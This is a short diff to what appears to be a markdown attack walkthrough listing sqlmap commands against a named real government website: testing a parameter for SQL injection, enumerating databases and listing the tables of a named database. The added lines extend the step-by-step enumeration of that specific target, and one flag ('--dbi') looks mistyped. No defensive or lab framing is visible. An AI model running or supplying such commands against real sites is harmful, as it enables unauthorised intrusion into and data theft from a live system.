@@ -65,14 +65,17 @@ Look behind you
 sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7
 ````
 
-### 2. Schema & Tables enum
+### 2. Schema & Databases enum
 
 ````
 sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7 --dbi
 ````
 
-### 3. 
+### 3. Tables from Database enum
 
+````
+sqlmap -u https://iieg[.]gob[.]mx/general.php?id=7 -D iieggob_documentos --tables
+````
  
  
  
